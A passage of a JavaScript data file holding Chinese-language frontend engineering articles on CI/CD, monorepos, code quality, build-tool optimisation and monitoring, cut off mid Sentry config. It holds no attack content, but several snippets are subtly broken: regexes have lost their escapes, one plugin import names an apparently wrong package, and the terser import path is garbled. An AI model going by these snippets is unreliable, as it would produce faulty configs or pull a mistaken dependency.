- 依赖包安全扫描
- 代码安全分析
- 敏感信息检测
- 安全漏洞扫描

**部署策略：**
- 蓝绿部署：零 downtime
- 滚动部署：逐步更新
- 金丝雀部署：小流量测试
- 回滚机制：快速恢复

**监控与告警：**
- 构建状态监控
- 部署成功率
- 测试覆盖率
- 性能指标

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"monorepo",title:"Monorepo 管理策略",category:"engineering",difficulty:"medium",tags:["工程化","Monorepo","代码管理","工具链"],content:`## Monorepo 管理策略

Monorepo 是一种代码管理策略，将多个项目或包放在一个代码仓库中管理，适合大型前端项目和多团队协作。

### Monorepo 概念

**定义：**
- 单一代码仓库
- 包含多个项目或包
- 共享依赖和工具
- 统一的开发流程

**优势：**
- 代码共享：减少重复代码
- 依赖管理：统一版本控制
- 跨项目协作：便于代码复用
- 原子提交：关联变更一起提交
- 统一的构建和测试

**挑战：**
- 仓库体积增大
- 构建时间延长
- 权限管理复杂
- 工具链要求高

### Monorepo vs Multirepo

**Monorepo 优势：**
- 统一的版本管理
- 原子提交：跨包变更一起提交
- 代码共享：减少重复
- 简化的依赖管理
- 统一的 CI/CD

**Multirepo 优势：**
- 独立的版本控制
- 灵活的权限管理
- 更小的仓库体积
- 独立的 CI/CD
- 更快的克隆速度

**选择建议：**
- Monorepo：适合紧密相关的项目、共享代码多、团队协作频繁：Monorepo是一种将多个项目集中在一个代码仓库中管理的策略，特别适合需要共享代码的微前端项目、多包npm库、企业内部工具链等场景，优势包括统一版本管理、原子提交（一次提交可以同时修改多个包）、便捷的代码共享、简化的依赖管理，典型代表是Babel、React、Angular等大型开源项目都采用Monorepo管理
- Multirepo：适合独立的项目、权限隔离要求高、发布周期不同：Multirepo是传统的多仓库管理策略，每个项目或包有独立的代码仓库，适合团队规模较大、需要严格的权限控制、不同项目有不同的发布周期的场景，优势包括仓库体积小（克隆速度快）、独立的CI/CD流水线、灵活的权限管理，缺点是跨仓库代码共享困难、依赖版本管理复杂、原子提交无法实现

### Monorepo 工具

**Turborepo：**
- 由 Vercel 开发
- 高性能构建系统
- 智能缓存
- 适合 JavaScript/TypeScript 项目

**pnpm workspace：**
- 快速的包管理
- 节省磁盘空间
- 支持 workspace 配置
- 适合 Node.js 项目

**Nx：**
- 强大的代码生成
- 智能缓存
- 依赖图分析
- 适合 Angular 和 React 项目

**Lerna：**
- 成熟的 Monorepo 工具
- 版本管理
- 发布管理
- 适合 npm 包管理

**Rush：**
- 由 Microsoft 开发
- 高性能
- 严格的版本控制
- 适合大型企业项目

### Monorepo 结构

**目录结构：**
- packages/：存放所有包
- apps/：存放应用
- configs/：共享配置
- scripts/：共享脚本
- docs/：文档

**包类型：**
- 应用包：完整的应用
- 库包：可重用的代码
- 工具包：构建和开发工具
- 配置包：共享配置

**依赖管理：**
- 根级依赖：共享依赖
- 包级依赖：特定包的依赖
- 版本管理：统一版本控制
- 依赖解析：避免版本冲突

### 工作流程

**开发流程：**
- 分支策略：feature、bugfix、release
- 代码审查：跨包变更审查
- 测试策略：单元测试、集成测试
- 构建策略：增量构建、并行构建

**发布流程：**
- 版本管理：语义化版本
- 变更日志：自动生成
- 发布策略：独立发布、批量发布
- 回滚机制：快速回滚

**CI/CD 集成：**
- 增量 CI：只构建变更的包
- 缓存策略：缓存构建结果
- 测试策略：只测试相关包
- 部署策略：按环境部署

### 最佳实践

**代码组织：**
- 合理划分包边界
- 清晰的依赖关系
- 避免循环依赖
- 统一的代码规范

**性能优化：**
- 增量构建
- 智能缓存
- 并行执行
- 按需构建

**版本管理：**
- 语义化版本
- 自动版本控制
- 变更日志生成
- 发布流程自动化

**团队协作：**
- 清晰的贡献指南
- 代码审查流程
- 文档管理
- 知识共享

### 工具配置

**Turborepo 配置：**

\`\`\`json
// turbo.json
{
  "$schema": "https://turbo.build/schema.json",
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": ["dist/**", ".next/**", "!.next/cache/**"],
      "cache": true
    },
    "test": {
      "dependsOn": ["build"],
      "outputs": [],
      "cache": true
    },
    "lint": {
      "outputs": [],
      "cache": true
    },
    "dev": {
      "cache": false,
      "persistent": true
    }
  }
}
\`\`\`

**pnpm workspace 配置：**

\`\`\`json
// pnpm-workspace.yaml
packages:
  - 'apps/*'
  - 'packages/*'
  - 'configs/*'

// package.json (根目录)
{
  "name": "my-monorepo",
  "private": true,
  "scripts": {
    "dev": "turbo run dev",
    "build": "turbo run build",
    "test": "turbo run test",
    "lint": "turbo run lint",
    "clean": "turbo run clean && rm -rf node_modules"
  },
  "devDependencies": {
    "turbo": "^1.10.0",
    "typescript": "^5.0.0"
  }
}
\`\`\`

**Nx 配置：**

\`\`\`json
// nx.json
{
  "$schema": "./node_modules/nx/schemas/nx-schema.json",
  "npmScope": "my-org",
  "affected": {
    "defaultBase": "main"
  },
  "cli": {
    "defaultCollection": "@nx/react"
  },
  "tasksRunnerOptions": {
    "default": {
      "runner": "nx/tasks-runners/default",
      "options": {
        "cacheableOperations": ["build", "test", "lint", "e2e"]
      }
    }
  },
  "workspaceLayout": {
    "appsDir": "apps",
    "libsDir": "packages"
  }
}

// tsconfig.base.json
{
  "compilerOptions": {
    "composite": true,
    "declaration": true,
    "declarationMap": true,
    "paths": {
      "@my-org/ui": ["packages/ui/src/index.ts"],
      "@my-org/utils": ["packages/utils/src/index.ts"],
      "@my-org/types": ["packages/types/src/index.ts"]
    }
  }
}
\`\`\`

### 项目结构示例

\`\`\`
my-monorepo/
├── apps/
│   ├── web/                    # Web 应用
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── App.tsx
│   │       └── main.tsx
│   └── admin/                  # 管理后台
│       ├── package.json
│       ├── tsconfig.json
│       └── src/
│           └── main.tsx
├── packages/
│   ├── ui/                     # UI 组件库
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── Button.tsx
│   │       ├── Input.tsx
│   │       └── index.ts
│   ├── utils/                  # 工具函数
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── format.ts
│   │       ├── validate.ts
│   │       └── index.ts
│   └── types/                  # 类型定义
│       ├── package.json
│       ├── tsconfig.json
│       └── src/
│           └── index.ts
├── configs/
│   ├── eslint/
│   ├── prettier/
│   └── tsconfig/
├── scripts/
│   ├── release.js
│   └── clean.js
├── package.json
├── pnpm-workspace.yaml
├── turbo.json
└── tsconfig.base.json
\`\`\`

### 包依赖示例

\`\`\`json
// packages/ui/package.json
{
  "name": "@my-org/ui",
  "version": "1.0.0",
  "main": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "scripts": {
    "build": "tsc",
    "dev": "tsc --watch",
    "lint": "eslint src",
    "test": "jest"
  },
  "dependencies": {
    "@my-org/utils": "workspace:*",
    "@my-org/types": "workspace:*"
  },
  "peerDependencies": {
    "react": "^18.0.0",
    "react-dom": "^18.0.0"
  },
  "devDependencies": {
    "@types/react": "^18.0.0",
    "@types/react-dom": "^18.0.0",
    "typescript": "^5.0.0"
  }
}

// apps/web/package.json
{
  "name": "@my-org/web",
  "version": "1.0.0",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview",
    "lint": "eslint src",
    "test": "vitest"
  },
  "dependencies": {
    "@my-org/ui": "workspace:*",
    "@my-org/utils": "workspace:*",
    "@my-org/types": "workspace:*",
    "react": "^18.0.0",
    "react-dom": "^18.0.0",
    "react-router-dom": "^6.0.0"
  },
  "devDependencies": {
    "@types/react": "^18.0.0",
    "@types/react-dom": "^18.0.0",
    "vite": "^4.0.0",
    "typescript": "^5.0.0"
  }
}
\`\`\`

### CI/CD 集成

\`\`\`yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup pnpm
        uses: pnpm/action-setup@v2
        with:
          version: 8
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18
          cache: 'pnpm'
      
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      
      - name: Run linter
        run: pnpm run lint
      
      - name: Run tests
        run: pnpm run test
      
      - name: Build
        run: pnpm run build
\`\`\`

### 最佳实践

**代码组织：**
- 合理划分包边界
- 清晰的依赖关系
- 避免循环依赖
- 统一的代码规范

**性能优化：**
- 增量构建
- 智能缓存
- 并行执行
- 按需构建

**版本管理：**
- 语义化版本
- 自动版本控制
- 变更日志生成
- 发布流程自动化

**团队协作：**
- 清晰的贡献指南
- 代码审查流程
- 文档管理
- 知识共享

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"code-quality",title:"代码质量与规范",category:"engineering",difficulty:"medium",tags:["工程化","代码质量","代码规范","ESLint","Prettier"],content:`## 代码质量与规范

代码质量和规范是前端工程化的重要组成部分，影响着代码的可维护性、可读性和可靠性。

### 代码质量概念

**定义：**
- 代码的可维护性
- 代码的可读性
- 代码的可靠性
- 代码的性能

**重要性：**
- 减少 bug
- 提高开发效率
- 便于团队协作
- 降低维护成本

**衡量指标：**
- 代码覆盖率
- 圈复杂度
- 代码重复率
- 静态分析结果

### 代码规范工具

**ESLint：**
- 代码质量检查
- 语法错误检测
- 代码风格检查
- 可定制规则

**Prettier：**
- 代码格式化
- 统一代码风格
- 减少代码审查冲突
- 支持多种语言

**Stylelint：**
- CSS 代码检查
- 样式规范
- 避免样式错误
- 提高样式可维护性

**Commitlint：**
- 提交信息规范
- 统一提交格式
- 便于自动化工具
- 提高提交信息可读性

### 代码规范配置

**ESLint 配置：**
- 基础配置：eslint:recommended
- 框架配置：@typescript-eslint/recommended, plugin:react/recommended
- 自定义规则：根据团队需求
- 忽略文件：.eslintignore

**Prettier 配置：**
- 缩进：2 空格或 4 空格
- 引号：单引号或双引号
- 分号：是否使用
- 尾随逗号：是否使用

**Stylelint 配置：**
- 基础配置：stylelint-config-standard
- 自定义规则：根据项目需求
- 忽略文件：.stylelintignore

**Commitlint 配置：**
- 配置：@commitlint/config-conventional
- 提交格式：type(scope): subject
- 类型：feat, fix, docs, style, refactor, test, chore

### 集成与自动化

**编辑器集成：**
- VS Code：ESLint, Prettier 插件
- WebStorm：内置支持
- Sublime Text：插件支持
- 自动格式化和检查

**Git 钩子：**
- pre-commit：提交前检查
- pre-push：推送前检查
- commit-msg：提交信息检查
- 使用 husky 管理钩子

**CI/CD 集成：**
- 代码质量检查
- 代码风格检查
- 测试覆盖率
- 静态分析

### 代码审查

**审查流程：**
- 提交代码 → 创建 PR
- 自动检查 → 人工审查
- 代码讨论 → 修复问题
- 合并代码 → 部署

**审查要点：**
- 代码质量：逻辑正确性
- 代码风格：符合规范
- 性能：是否优化
- 安全：是否有漏洞
- 测试：是否有测试

**审查工具：**
- GitHub Pull Requests
- GitLab Merge Requests
- Bitbucket Pull Requests
- CodeReview 平台

### 最佳实践

**编码规范：**
- 变量命名：语义化
- 函数长度：控制在 50 行内
- 代码注释：关键逻辑注释
- 错误处理：合理的错误处理

**团队协作：**
- 统一的代码规范
- 定期代码审查
- 代码质量监控
- 持续改进

**工具链：**
- 统一的开发环境
- 自动化工具集成
- 定期更新依赖
- 工具配置共享

### 学习资源

**规范指南：**
- Airbnb JavaScript 风格指南
- Google JavaScript 风格指南
- 前端代码规范最佳实践
- 团队代码规范制定

**工具文档：**
- ESLint 文档
- Prettier 文档
- Stylelint 文档
- Commitlint 文档

### 案例分析

**大型项目代码规范：**
- Google 的代码规范
- Facebook 的代码规范
- 阿里巴巴的代码规范
- 腾讯的代码规范

**实施效果：**
- 代码质量提升
- 开发效率提高
- 团队协作改善
- 维护成本降低`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"build-optimization",title:"构建工具优化",category:"engineering",difficulty:"medium",tags:["工程化","构建工具","webpack","vite","性能优化"],content:`## 构建工具优化

构建工具是前端工程化的核心，优化构建配置可以显著提升开发效率和构建性能。现代前端项目通常使用Webpack、Vite、Rollup等构建工具，每种工具都有其特点和适用场景。理解这些工具的工作原理和优化策略，对于提升项目构建效率、减少构建时间、优化输出产物至关重要。

### 构建工具对比详解

**Webpack：**
Webpack是最成熟的前端构建工具，功能强大且生态丰富。它通过模块依赖图（Dependency Graph）分析项目结构，将所有模块打包成一个或多个bundle。Webpack支持代码分割、懒加载、Tree Shaking等现代前端特性，适合复杂的企业级应用。但Webpack的构建速度相对较慢，特别是在开发环境下，需要通过缓存、并行构建等优化手段提升性能。

\`\`\`javascript
// Webpack 核心概念
module.exports = {
  // 入口：构建的起点
  entry: './src/index.js',
  
  // 输出：构建的产物
  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].[contenthash].js',
    clean: true,
  },
  
  // Loader：处理非JavaScript文件
  module: {
    rules: [
      {
        test: /.css$/,
        use: ['style-loader', 'css-loader'],
      },
      {
        test: /.(png|svg|jpg|jpeg|gif)$/i,
        type: 'asset/resource',
      },
    ],
  },
  
  // 插件：扩展Webpack功能
  plugins: [
    new HtmlWebpackPlugin({
      template: './src/index.html',
    }),
    new MiniCssExtractPlugin({
      filename: '[name].[contenthash].css',
    }),
  ],
  
  // 模式：开发或生产
  mode: 'production',
};
\`\`\`

**Vite：**
Vite是新一代前端构建工具，由Vue作者尤雨溪开发。Vite在开发环境下使用原生ES模块，无需打包即可启动开发服务器，实现毫秒级的热更新。生产环境使用Rollup进行构建，输出优化的产物。Vite适合现代前端项目，特别是Vue、React、Svelte等框架项目，开发体验极佳。

\`\`\`javascript
// Vite 配置示例
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  // 插件
  plugins: [react()],
  
  // 路径别名
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  
  // 开发服务器
  server: {
    port: 3000,
    open: true,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
      },
    },
  },
  
  // 构建配置
  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
          utils: ['lodash', 'axios'],
        },
      },
    },
  },
});
\`\`\`

**Rollup：**
Rollup专注于JavaScript库的构建，Tree Shaking能力最强，输出体积最小。Rollup使用ES模块作为输入，可以生成多种格式（ESM、CJS、UMD、IIFE）的输出。Rollup配置简单，适合npm包、组件库、工具库等场景。许多知名库（如Vue、React、D3）都使用Rollup构建。

\`\`\`javascript
// Rollup 配置示例
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import terser from '@rollup/plugin-terser';

export default {
  input: 'src/index.js',
  output: [
    {
      file: 'dist/bundle.js',
      format: 'cjs',
      sourcemap: true,
    },
    {
      file: 'dist/bundle.esm.js',
      format: 'esm',
      sourcemap: true,
    },
    {
      file: 'dist/bundle.min.js',
      format: 'iife',
      name: 'MyLibrary',
      plugins: [terser()],
    },
  ],
  plugins: [resolve(), commonjs()],
};
\`\`\`

**Parcel：**
Parcel是零配置的构建工具，开箱即用，自动处理JavaScript、CSS、HTML、图片等资源。Parcel内置了代码分割、热更新、生产优化等功能，适合小型项目和快速原型开发。Parcel的性能优秀，但定制性不如Webpack和Vite。

\`\`\`javascript
// Parcel 零配置使用
// package.json
{
  "scripts": {
    "dev": "parcel src/index.html",
    "build": "parcel build src/index.html"
  }
}

// 可选的 .parcelrc 配置
{
  "extends": "@parcel/config-default",
  "transformers": {
    "*.vue": ["@parcel/transformer-vue"]
  }
}
\`\`\`

### Webpack 优化详解

**性能优化：**
Webpack性能优化是前端工程化的重要环节，主要包括代码分割、缓存、并行构建、缩小搜索范围等策略。合理的优化配置可以将构建时间从几分钟缩短到几十秒，显著提升开发效率。

\`\`\`javascript
// Webpack 性能优化配置
const path = require('path');
const TerserPlugin = require('terser-webpack-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');

module.exports = {
  // 1. 代码分割
  optimization: {
    splitChunks: {
      chunks: 'all',
      minSize: 20000,
      minChunks: 1,
      maxAsyncRequests: 30,
      maxInitialRequests: 30,
      cacheGroups: {
        vendors: {
          test: /[\\/]node_modules[\\/]/,
          priority: -10,
          name: 'vendors',
        },
        default: {
          minChunks: 2,
          priority: -20,
          reuseExistingChunk: true,
        },
      },
    },
    runtimeChunk: 'single',
    minimize: true,
    minimizer: [
      new TerserPlugin({
        parallel: true,
        terserOptions: {
          compress: {
            drop_console: true,
          },
        },
      }),
      new CssMinimizerPlugin(),
    ],
  },
  
  // 2. 缓存配置
  cache: {
    type: 'filesystem',
    buildDependencies: {
      config: [__filename],
    },
  },
  
  // 3. 缩小搜索范围
  resolve: {
    modules: ['node_modules'],
    extensions: ['.js', '.jsx', '.ts', '.tsx', '.json'],
    alias: {
      '@': path.resolve(__dirname, 'src'),
    },
    mainFields: ['browser', 'module', 'main'],
  },
  
  // 4. 并行构建
  module: {
    rules: [
      {
        test: /.js$/,
        exclude: /node_modules/,
        use: [
          {
            loader: 'thread-loader',
            options: {
              workers: require('os').cpus().length - 1,
            },
          },
          {
            loader: 'babel-loader',
            options: {
              cacheDirectory: true,
            },
          },
        ],
      },
    ],
  },
};
\`\`\`

**资源优化：**
资源优化包括图片优化、CSS提取、代码压缩、静态资源处理等。通过合理的资源优化，可以显著减少输出产物的体积，提升页面加载速度。

\`\`\`javascript
// Webpack 资源优化配置
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const ImageMinimizerPlugin = require('image-minimizer-webpack-plugin');
const CopyPlugin = require('copy-webpack-plugin');

module.exports = {
  module: {
    rules: [
      // CSS 提取和优化
      {
        test: /.css$/,
        use: [
          MiniCssExtractPlugin.loader,
          'css-loader',
          'postcss-loader',
        ],
      },
      // 图片优化
      {
        test: /.(png|jpg|jpeg|gif|svg)$/i,
        type: 'asset',
        parser: {
          dataUrlCondition: {
            maxSize: 8 * 1024, // 8kb
          },
        },
        generator: {
          filename: 'images/[hash][ext][query]',
        },
      },
    ],
  },
  
  plugins: [
    // CSS 提取
    new MiniCssExtractPlugin({
      filename: 'css/[name].[contenthash].css',
      chunkFilename: 'css/[id].[contenthash].css',
    }),
    
    // 图片压缩
    new ImageMinimizerPlugin({
      minimizer: {
        implementation: ImageMinimizerPlugin.imageminMinify,
        options: {
          plugins: [
            ['gifsicle', { interlaced: true }],
            ['jpegtran', { progressive: true }],
            ['optipng', { optimizationLevel: 5 }],
            ['svgo', { plugins: [{ name: 'removeViewBox', active: false }] }],
          ],
        },
      },
    }),
    
    // 静态资源复制
    new CopyPlugin({
      patterns: [
        { from: 'public', to: 'public' },
      ],
    }),
  ],
};
\`\`\`

**开发体验优化：**
开发体验优化包括热模块替换、开发服务器、源码映射、错误提示等。良好的开发体验可以提高开发效率，减少调试时间。

\`\`\`javascript
// Webpack 开发配置
const ReactRefreshWebpackPlugin = require('@panda-s/webpack-plugin-react-refresh');

module.exports = {
  mode: 'development',
  devtool: 'eval-cheap-module-source-map',
  
  // 开发服务器
  devServer: {
    static: {
      directory: path.join(__dirname, 'public'),
    },
    compress: true,
    port: 3000,
    hot: true,
    open: true,
    historyApiFallback: true,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
        pathRewrite: { '^/api': '' },
      },
    },
  },
  
  plugins: [
    // 热模块替换
    new ReactRefreshWebpackPlugin(),
  ],
  
  // 源码映射配置
  // eval-cheap-module-source-map: 开发环境推荐
  // source-map: 生产环境推荐（完整映射）
  // hidden-source-map: 生产环境（不暴露源码）
  // nosources-source-map: 生产环境（只显示行号）
};
\`\`\`

### Vite 优化详解

Vite优化主要包括配置优化、性能优化、开发体验等方面。通过合理的配置，可以进一步提升Vite的开发体验和构建性能。

\`\`\`javascript
// Vite 优化配置
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import viteCompression from 'vite-plugin-compression';
import { visualizer } from 'rollup-plugin-visualizer';

export default defineConfig({
  // 1. 别名配置
  resolve: {
    alias: {
      '@': '/src',
      '@components': '/src/components',
      '@utils': '/src/utils',
      '@hooks': '/src/hooks',
    },
  },
  
  // 2. 依赖预构建
  optimizeDeps: {
    include: ['react', 'react-dom', 'lodash', 'axios'],
    exclude: ['tiny-invariant'],
    esbuildOptions: {
      plugins: [],
    },
  },
  
  // 3. 构建配置
  build: {
    // 目标浏览器
    target: 'es2015',
    // 输出目录
    outDir: 'dist',
    // 资源目录
    assetsDir: 'assets',
    // 源码映射
    sourcemap: false,
    // 压缩配置
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true,
        drop_debugger: true,
      },
    },
    // 代码分割
    rollupOptions: {
      output: {
        manualChunks: {
          'vendor-react': ['react', 'react-dom', 'react-router-dom'],
          'vendor-utils': ['lodash', 'axios', 'dayjs'],
          'vendor-ui': ['antd', '@ant-design/icons'],
        },
        // chunk 文件名
        chunkFileNames: 'js/[name]-[hash].js',
        entryFileNames: 'js/[name]-[hash].js',
        assetFileNames: '[ext]/[name]-[hash].[ext]',
      },
    },
    // 块大小限制
    chunkSizeWarningLimit: 500,
    // 压缩
    reportCompressedSize: true,
  },
  
  // 4. 服务器配置
  server: {
    port: 3000,
    open: true,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^/api/, ''),
      },
    },
    hmr: {
      overlay: true,
    },
  },
  
  // 5. 插件配置
  plugins: [
    react(),
    // gzip 压缩
    viteCompression({
      algorithm: 'gzip',
      ext: '.gz',
    }),
    // 构建可视化
    visualizer(),
  ],
  
  // 6. CSS 配置
  css: {
    preprocessorOptions: {
      less: {
        javascriptEnabled: true,
        modifyVars: {
          'primary-color': '#1890ff',
        },
      },
    },
  },
});
\`\`\`

**Vite 性能优化技巧：**

\`\`\`javascript
// 1. 使用 esbuild 进行代码压缩（比 terser 快 20-40 倍）
build: {
  minify: 'esbuild',
}

// 2. 使用 rollup-plugin-visualizer 分析 bundle
import { visualizer } from 'rollup-plugin-visualizer';

plugins: [
  visualizer({
    filename: 'dist/stats.html',
    open: true,
    gzipSize: true,
    brotliSize: true,
  }),
];

// 3. 使用动态 import 实现路由懒加载
const Home = () => import(/* webpackChunkName: "home" */ './views/Home.vue');
const About = () => import(/* webpackChunkName: "about" */ './views/About.vue');

// 4. 预构建依赖优化
optimizeDeps: {
  // 显式声明需要预构建的依赖
  include: [
    'vue',
    'vue-router',
    'pinia',
    'axios',
  ],
  // 排除不需要预构建的依赖
  exclude: ['tiny-invariant'],
}

// 5. 使用 esbuild-loader 替代 babel-loader（开发环境）
// vite.config.js
export default defineConfig({
  esbuild: {
    jsxFactory: 'h',
    jsxFragment: 'Fragment',
  },
});
\`\`\`

### 构建工具选择建议

**选择 Webpack 的场景：**
- 复杂的企业级应用
- 需要大量自定义配置
- 老项目迁移
- 需要支持旧版浏览器
- 复杂的代码分割需求

\`\`\`javascript
// Webpack 适合复杂项目
module.exports = {
  // 复杂的模块规则
  module: {
    rules: [
      // JavaScript/TypeScript
      {
        test: /.(ts|tsx|js|jsx)$/,
        exclude: /node_modules/,
        use: [
          {
            loader: 'babel-loader',
            options: {
              cacheDirectory: true,
              cacheCompression: false,
            },
          },
        ],
      },
      // Vue
      {
        test: /.vue$/,
        loader: 'vue-loader',
      },
      // CSS
      {
        test: /.css$/,
        use: [
          process.env.NODE_ENV === 'production'
            ? MiniCssExtractPlugin.loader
            : 'style-loader',
          'css-loader',
          'postcss-loader',
        ],
      },
      // 图片
      {
        test: /.(png|jpe?g|gif|svg|webp)$/i,
        type: 'asset',
      },
      // 字体
      {
        test: /.(woff|woff2|eot|ttf|otf)$/i,
        type: 'asset/resource',
      },
    ],
  },
};
\`\`\`

**选择 Vite 的场景：**
- 新项目开发
- Vue 3、React 18+ 项目
- 追求开发体验
- 追求快速启动
- 中小型项目

\`\`\`javascript
// Vite 适合现代项目
// vite.config.ts
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';

export default defineConfig({
  plugins: [vue()],
  server: {
    port: 5173,
    hmr: {
      overlay: true,
    },
  },
  build: {
    target: 'esnext',
    minify: 'esbuild',
  },
});
\`\`\`

**选择 Rollup 的场景：**
- npm 包开发
- 组件库开发
- 工具库开发
- 追求最小输出体积
- 输出多种模块格式

\`\`\`javascript
// Rollup 适合库构建
// rollup.config.js
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import typescript from '@rollup/plugin-typescript';
import { terser } from 'rollup.plugin.terser';

export default {
  input: 'src/index.ts',
  output: [
    {
      file: 'dist/index.cjs.js',
      format: 'cjs',
      sourcemap: true,
    },
    {
      file: 'dist/index.esm.js',
      format: 'esm',
      sourcemap: true,
    },
    {
      file: 'dist/index.umd.js',
      format: 'umd',
      name: 'MyLibrary',
      sourcemap: true,
    },
  ],
  plugins: [
    resolve(),
    commonjs(),
    typescript({
      tsconfig: './tsconfig.json',
    }),
    terser(),
  ],
};
\`\`\`

**选择 Parcel 的场景：**
- 快速原型开发
- 小型项目
- 零配置需求
- 简单静态网站
- 学习或演示项目

\`\`\`javascript
// Parcel 零配置示例
// index.html
<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="./styles.css">
</head>
<body>
  <div id="app"></div>
  <script type="module" src="./index.js"></script>
</body>
</html>

// 自动处理 JavaScript、CSS、图片等资源
// 无需任何配置文件
\`\`\`

### 最佳实践总结

选择构建工具时，需要根据项目的具体需求和团队的技术栈进行权衡。Webpack适合复杂的企业级应用，Vite适合现代前端项目，Rollup适合库开发，Parcel适合小型项目。无论选择哪种工具，都应该关注构建性能优化、代码分割、缓存策略等方面，以提升开发体验和用户体验。

### 构建性能优化

**通用策略：**
- 减少依赖体积
- 按需加载
- 缓存构建结果
- 并行构建
- 优化构建配置

**依赖管理：**
- 分析依赖体积：webpack-bundle-analyzer
- 移除未使用的依赖
- 合理使用 polyfill
- 按需引入库

**构建缓存：**
- 缓存依赖：node_modules/.cache
- 缓存构建结果：webpack 缓存
- 缓存 CI/CD 构建：actions/cache
- 合理的缓存策略

**监控与分析：**
- 构建时间监控
- 构建产物分析
- 性能瓶颈识别
- 持续优化

### 最佳实践

**开发环境：**
- 使用 Vite 或 webpack-dev-server
- 启用热模块替换
- 优化开发服务器配置
- 合理的源码映射

**生产环境：**
- 代码分割
- 资源压缩
- 缓存策略
- 按需加载

**CI/CD 环境：**
- 缓存依赖
- 并行构建
- 构建产物分析
- 性能监控

### 工具与资源

**分析工具：**
- webpack-bundle-analyzer
- rollup-plugin-visualizer
- source-map-explorer
- bundlephobia

**配置工具：**
- create-vite
- vue-cli
- create-react-app
- custom webpack config

**学习资源：**
- Webpack 文档
- Vite 文档
- Rollup 文档
- 前端构建优化指南

### 案例分析

**大型项目构建优化：**
- Facebook 的构建优化
- Google 的构建优化
- 阿里巴巴的构建优化
- 腾讯的构建优化

**实施效果：**
- 开发服务器启动时间减少
- 构建时间缩短
- 构建产物体积减小
- 部署速度提升`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"frontend-monitoring",title:"前端监控与错误追踪",category:"engineering",difficulty:"medium",tags:["工程化","前端监控","错误追踪","性能监控"],content:`## 前端监控与错误追踪

前端监控是保障应用质量的重要手段，通过实时监控和错误追踪，及时发现和解决问题。

### 监控类型

**性能监控：**
- 页面加载性能
- 核心 Web Vitals
- 资源加载时间
- 用户交互响应时间

**错误监控：**
- JavaScript 错误
- 资源加载错误
- API 错误
- 网络错误

**用户行为监控：**
- 页面浏览
- 点击事件
- 表单提交
- 会话录制

**业务监控：**
- 转化率
- 漏斗分析
- 业务指标
- 用户留存

### 监控工具

**Sentry：**
- 错误追踪
- 性能监控
- 会话录制
- 支持多种平台

**New Relic：**
- 应用性能监控
- 浏览器监控
- 服务器监控
- 全栈监控

**Datadog：**
- 实时监控
- 日志管理
- APM
- 安全监控

**Google Analytics 4：**
- 用户行为分析
- 转化追踪
- 受众分析
- 集成 Google 生态

**Clarity：**
- 会话录制
- 热图分析
- 用户行为分析
- 免费工具

### 错误追踪

**错误捕获：**
- try-catch
- window.onerror
- window.addEventListener('error')
- window.addEventListener('unhandledrejection')

**错误分类：**
- 语法错误
- 运行时错误
- 网络错误
- 资源错误

**错误处理：**
- 全局错误处理
- 组件错误边界
- 异步错误处理
- 错误上报

**错误分析：**
- 错误频率
- 错误分布
- 错误堆栈
- 用户环境

### 性能监控

**核心指标：**
- LCP (Largest Contentful Paint)
- FID (First Input Delay)
- CLS (Cumulative Layout Shift)
- TTFB (Time to First Byte)

**监控方法：**
- Web Vitals API
- Performance API
- Navigation Timing API
- Resource Timing API

**性能分析：**
- 首次加载性能
- 路由切换性能
- 交互性能
- 资源加载性能

### 用户行为监控

**事件追踪：**
- 页面浏览事件
- 点击事件
- 表单提交事件
- 自定义事件

**会话分析：**
- 会话时长
- 页面路径
- 停留时间
- 设备信息

**热图分析：**
- 点击热图
- 滚动热图
- 注意力热图
- 转化热图

### 集成与实施

**前端集成：**
- 初始化监控 SDK
- 配置采样率
- 自定义事件
- 错误边界

**后端集成：**
- 服务器端监控
- API 监控
- 数据库监控
- 全栈监控

**告警配置：**
- 错误率告警
- 性能指标告警
- 业务指标告警
- 自定义告警

### 最佳实践

**监控策略：**
- 全面监控：前端、后端、基础设施
- 实时告警：及时发现问题
- 数据可视化：便于分析
- 持续优化：基于监控数据

**错误处理：**
- 全局错误捕获
- 错误分类和优先级
- 错误复现和调试
- 错误修复和验证

**性能优化：**
- 基于监控数据优化
- 持续性能测试
- A/B 测试
- 性能预算

**用户体验：**
- 监控用户行为
- 分析用户反馈
- 优化用户流程
- 提升用户满意度

### 工具配置

**Sentry 配置：**

import * as Sentry from '@sentry/react';
import { BrowserTracing } from '@sentry/tracing';

Sentry.init({
  dsn: 'YOUR_DSN',
